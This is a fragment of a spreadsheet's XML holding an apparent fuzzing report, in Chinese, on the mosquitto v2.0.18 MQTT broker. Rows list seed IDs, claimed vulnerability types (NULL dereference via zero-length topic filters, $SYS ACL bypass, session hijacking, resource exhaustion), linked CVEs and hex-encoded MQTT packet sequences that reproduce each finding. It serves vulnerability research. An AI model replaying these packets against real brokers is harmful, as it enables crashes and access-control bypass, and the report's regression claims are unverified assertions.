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4" fillId="3" borderId="1" pivotButton="0" quotePrefix="0" xfId="0"/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42" customWidth="1" min="3" max="3"/>
    <col width="58" customWidth="1" min="4" max="4"/>
    <col width="58" customWidth="1" min="5" max="5"/>
    <col width="32" customWidth="1" min="6" max="6"/>
    <col width="52" customWidth="1" min="7" max="7"/>
    <col width="62" customWidth="1" min="8" max="8"/>
    <col width="22" customWidth="1" min="9" max="9"/>
    <col width="58" customWidth="1" min="10" max="10"/>
    <col width="65" customWidth="1" min="11" max="11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  <c r="K1" s="1" t="inlineStr">
        <is>
          <t>漏洞带来的影响</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000004,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B2" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C2" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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将种子文件(id:000004,sev:3,cat:0305)中的REQUEST DATA提取出来(59B)\u000a4.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2" s="2">
        <f>== 种子标识: id:000004,sev:3,cat:0305 ===\u000a大小: 748B (报告+请求数据)\u000a请求数据: 59B\u000a\u000a---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MQTT请求序列(59B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v237 ClientID=''(255B) clean_session=False keepalive=0s [持久会话] | raw_header=101500044d515454ed0100000000ff66\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['ue\x83t/\x00'(QoS=0)] | raw_header=820b00010006756583742f0000\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=['ue\x83t/\x00'(QoS=0)] | raw_header=820b00010006756583742f0000\u000aMsg[4]: (不完整,10B) raw=044d51545f0002b9c4ed\u000a(尾部10B): 044d51545f0002b9c4ed</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A3" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000005,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B3" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C3" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(96B)\u000a4.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" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:00c0 ===\u000a大小: 659B (报告+请求数据)\u000a请求数据: 96B\u000a\u000a---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MQTT请求序列(96B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='aflnet_c0'(9B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003c00096166\u000aMsg[2]: SUBSCRIBE PacketID=1025 Topics=['st/#\x00À'(QoS=0)] | raw_header=820b0401000673742f2300c000\u000aMsg[3]: SUBSCRIBE PacketID=1942 Topics=[''(零长度!QoS=2), '$share/grp1/#'(QoS=2)] | raw_header=82150796000002000d2473686172652f\u000aMsg[4]: PUBLISH Topic='home/+/temperature' QoS=0 retain=True payload='óZ\x82¾u\x7fêã\x92e\x98\x07Ú' | raw_header=39210012686f6d652f2b2f74656d7065\u000aMsg[5]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A4" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000005,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B4" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C4" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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4" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:0244 ===\u000a大小: 610B (报告+请求数据)\u000a请求数据: 71B\u000a\u000a---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MQTT请求序列(71B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2376 Topics=['$SYS/broker/clients/connected'(QoS=1), ''(零长度!QoS=1)] | raw_header=82250948001d245359532f62726f6b65\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=False payload='\u0009Iîäë¯' | raw_header=3c1d00152473686172652f6772702f74\u000aMsg[3]: PUBREL  | raw_header=6f</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A5" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000005,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B5" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C5" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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将种子文件(id:000005,sev:4,cat:02c4)中的REQUEST DATA提取出来(102B)\u000a4.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5" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:02c4 ===\u000a大小: 829B (报告+请求数据)\u000a请求数据: 102B\u000a\u000a---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MQTT请求序列(102B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1933 Topics=[''(零长度!QoS=0), '#'(QoS=2), ''(零长度!QoS=2)] | raw_header=820c078d00000000012302000002\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=0 retain=True payload_len=62B | raw_header=395500152473686172652f6772702f74\u000aMsg[3]: PUBREL  | raw_header=64</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A6" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000006,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B6" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C6" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0002 ===\u000a大小: 906B (报告+请求数据)\u000a请求数据: 157B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(157B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=289 Topics=[] | raw_header=822d0121270ba6bde12b26001c247368\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=76B | raw_header=3c6b001d245359532f62726f6b65722f\u000aMsg[3]: AUTH  | raw_header=ff</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A7" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000006,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B7" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C7" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(541B)\u000a4.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" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0082 ===\u000a大小: 1090B (报告+请求数据)\u000a请求数据: 541B\u000a\u000a---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MQTT请求序列(541B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=60 Topics=[] | raw_header=821c003c050bf4d1d269000d24736861\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload_len=114B | raw_header=3287010013245359532f62726f6b6572\u000aMsg[3]: PUBLISH Topic='a/b/cNdpi' QoS=2 retain=True payload_len=56B | raw_header=35430009612f622f634e64706963000b\u000aMsg[4]: PUBREL PacketID=24902 | raw_header=6161614661616101610df7e700000040\u000aMsg[5]: PUBREC PacketID=21509 | raw_header=51545405c62a18000000080100020000\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1010800026f30d6d4266757a7a65725f\u000aMsg[7]: (不完整,101B) raw=6e745f30312a180000000040000700000e1003800a74657a5f76356a70617373c000e0100061615b\u000a(尾部101B): 6e745f30312a180000000040000700000e1003800a74657a5f76356a70617373c000e0100061615b77610002000061616161</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A8" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000006,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B8" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C8" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(44B)\u000a4.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8" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0101 ===\u000a大小: 570B (报告+请求数据)\u000a请求数据: 44B\u000a\u000a---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MQTT请求序列(44B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v130 ClientID=''(0B) clean_session=False keepalive=9s Will=YES [持久会话] | raw_header=101500044d5154548205000900000066\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[3]: PUBREL PacketID=2 | raw_header=62020002\u000aMsg[4]: PINGREQ  | raw_header=c000\u000aMsg[5]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J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9">
      <c r="A9" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000006,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B9" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C9" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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9" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0206 ===\u000a大小: 856B (报告+请求数据)\u000a请求数据: 69B\u000a\u000a---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MQTT请求序列(69B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2554 Topics=['$share/grp1/#'(QoS=2)] | raw_header=821209fa000d2473686172652f677270\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload='\u0009ûXÜ"¶p\x02¯¤\x95\x91\x9dM"\x15(ù&amp;P&gt;\x95\x14E\x86' | raw_header=322e0013245359532f62726f6b65722f\u000aMsg[3]: CONNACK  | raw_header=2b</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A10" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000006,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B10" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C10" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(44B)\u000a4.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0" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0040 ===\u000a大小: 1107B (报告+请求数据)\u000a请求数据: 44B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(44B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=413 Topics=[''(零长度!QoS=1)] | raw_header=8205019d000001\u000aMsg[2]: PUBLISH Topic='$share/grp2/sensor/#' QoS=1 retain=False payload='\x01\x9eT|dTÏ' | raw_header=3a1d00142473686172652f677270322f\u000aMsg[3]: PUBACK PacketID=10 | raw_header=4002000a\u000aMsg[4]: (不完整,2B) raw=e0d5\u000a(尾部2B): e0d5</f>
        <v/>
      </c>
      <c r="F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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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1">
      <c r="A11" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000006,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B11" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C11" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(106B)\u000a4.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1" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c0 ===\u000a大小: 707B (报告+请求数据)\u000a请求数据: 106B\u000a\u000a---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MQTT请求序列(106B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1295 Topics=[''(零长度!QoS=1), '+/data'(QoS=2), '+/data'(QoS=1)] | raw_header=8217050f00000100062b2f6461746102\u000aMsg[2]: PUBLISH Topic='$share/grp2/sensor/#' QoS=1 retain=True payload_len=56B | raw_header=3b4e00142473686172652f677270322f\u000aMsg[3]: PUBREC  | raw_header=5f</f>
        <v/>
      </c>
      <c r="F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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A12" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000006,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B12" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C12" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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2" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0244 ===\u000a大小: 795B (报告+请求数据)\u000a请求数据: 122B\u000a\u000a---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PacketID=2432 Topics=['t'(QoS=1), '$share/grp2/sensor/#'(QoS=0), ''(零长度!QoS=2)] | raw_header=82200980000174010014247368617265\u000aMsg[2]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=1 retain=False payload_len=55B | raw_header=3a55001c2473686172652f67332f686f\u000aMsg[3]: TYPE0  | raw_header=01</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A13" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000007,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B13" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C13" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D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将种子文件(id:000007,sev:3,cat:00c0)中的REQUEST DATA提取出来(460B)\u000a4.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13" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:00c0 ===\u000a大小: 1704B (报告+请求数据)\u000a请求数据: 460B\u000a\u000a---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MQTT请求序列(460B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='a/b/c/d/e' QoS=2 retain=True payload_len=56B | raw_header=35430009612f622f632f642f650981e0\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=262626262626e8032626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262613262626262626262626\u000aMsg[4]: (不完整,311B) raw=26823a003f000000001d245359532f62726f6b65722f636c69656e74732f636f6e6e656374656400\u000a(尾部311B): 26823a003f000000001d245359532f62726f6b65722f636c69656e74732f636f6e6e6563746564000012686f6d652f2b2f74</f>
        <v/>
      </c>
      <c r="F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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J1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3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4">
      <c r="A14" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000007,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B14" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C14" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(141B)\u000a4.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14" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0286 ===\u000a大小: 1889B (报告+请求数据)\u000a请求数据: 141B\u000a\u000a---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MQTT请求序列(141B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=149 Topics=['very/deep/topic/level1/level2/level3/level4'(QoS=2)] | raw_header=82300095002b766572792f646565702f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=43B | raw_header=314a001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,15B) raw=375542535e529b0100067464ff7f2f\u000a(尾部15B): 375542535e529b0100067464ff7f2f</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A15" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000007,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B15" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C15" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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5" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c0 ===\u000a大小: 629B (报告+请求数据)\u000a请求数据: 24B\u000a\u000a---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MQTT请求序列(24B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=34080 Topics=['\x00'(QoS=2), ''(零长度!QoS=1)] | raw_header=820b8520000100160000715e10\u000aMsg[2]: TYPE0  | raw_header=000104\u000aMsg[3]: TYPE0  | raw_header=0600\u000aMsg[4]: (不完整,6B) raw=006202762910\u000a(尾部6B): 006202762910</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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6">
      <c r="A16" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000007,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B16" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C16" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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16" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c4 ===\u000a大小: 1888B (报告+请求数据)\u000a请求数据: 173B\u000a\u000a---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MQTT请求序列(173B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=192 Topics=[''(零长度!QoS=1)] | raw_header=820f00c0000009612f622f632f642f65\u000aMsg[2]: PUBLISH Topic='$share/grp2/sensor/#' QoS=1 retain=True payload_len=129B | raw_header=33970100142473686172652f67727032\u000aMsg[3]: (不完整,2B) raw=0011\u000a(尾部2B): 0011</f>
        <v/>
      </c>
      <c r="F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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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7">
      <c r="A17" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000007,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B17" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C17" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(145B)\u000a4.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17" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c6 ===\u000a大小: 1861B (报告+请求数据)\u000a请求数据: 145B\u000a\u000a---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MQTT请求序列(145B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=117 Topics=[''(零长度!QoS=1), 'very/deep/topic/level1/level2/level3/level4'(QoS=0), '$share/grp1/test/+'(QoS=2)] | raw_header=82480075000001002b766572792f6465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload='Ú\x15\x9ad\x82Ã¶; ñ³øÒ¬¬ùã\x1dC]9Þ\x98æ@·D¾ó¨áÎ¾{2' | raw_header=3042001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,3B) raw=6d5523\u000a(尾部3B): 6d5523</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A18" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B18" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C18" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(242B)\u000a4.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8" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0082 ===\u000a大小: 755B (报告+请求数据)\u000a请求数据: 242B\u000a\u000a---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MQTT请求序列(242B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=['yestF#'(QoS=0)] | raw_header=820b0001000679657374462300\u000aMsg[2]: SUBSCRIBE PacketID=117 Topics=[] | raw_header=82410075050ba09fd5650012686f6d65\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=128B | raw_header=319f01001d245359532f62726f6b6572</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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">
      <c r="A19" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B19" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C19" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D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19" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c0 ===\u000a大小: 872B (报告+请求数据)\u000a请求数据: 185B\u000a\u000a---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MQTT请求序列(185B原始二进制) ---\u000aMsg[1]: PUBREL  | raw_header=628000\u000aMsg[2]: CONNACK session_present=38 reason_code=54 | raw_header=262626366565705f6d6582120002000d\u000aMsg[3]: PUBCOMP PacketID=31327 | raw_header=757a7a5f63343116000d746573742f76\u000aMsg[4]: (不完整,18B) raw=72657474696e6564001021742f000700e000\u000a(尾部18B): 72657474696e6564001021742f000700e000</f>
        <v/>
      </c>
      <c r="F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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J1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9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0">
      <c r="A20" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B20" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C20" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(4323B)\u000a4.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0" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0181 ===\u000a大小: 4812B (报告+请求数据)\u000a请求数据: 4323B\u000a\u000a---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MQTT请求序列(4323B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10150000000000000000000000000000\u000aMsg[2]: (不完整,4264B) raw=d4d4d4d4d4d4d4d4d4d4d4d400000000000000000000000000000000000000000000000000000000\u000a(尾部4264B): d4d4d4d4d4d4d4d4d4d4d4d400000000000000000000000000000000000000000000000000000000000000000000d4d4d4d4</f>
        <v/>
      </c>
      <c r="F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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J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1">
      <c r="A21" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:3,cat:018a</t>
        </is>
      </c>
      <c r="B21" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C21" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D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将种子文件(id:000008,sev:3,cat:018a)中的REQUEST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0x018a\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E21" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:018a ===\u000a大小: 966B (报告+请求数据)\u000a请求数据: 247B\u000a\u000a---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$SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(247B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=102200044d51545404c2003c00000009\u000aMsg[2]: SUBSCRIBE PacketID=16 Topics=['$SYS/#'(QoS=0)] | raw_header=827f00100006245359532f230032ff00\u000aMsg[3]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[4]: (不完整,15B) raw=4141414141414141414141c000e000\u000a(尾部15B): 4141414141414141414141c000e000</f>
        <v/>
      </c>
      <c r="F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2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21" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J2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2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22">
      <c r="A22" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000008,sev:3,cat:0286</t>
        </is>
      </c>
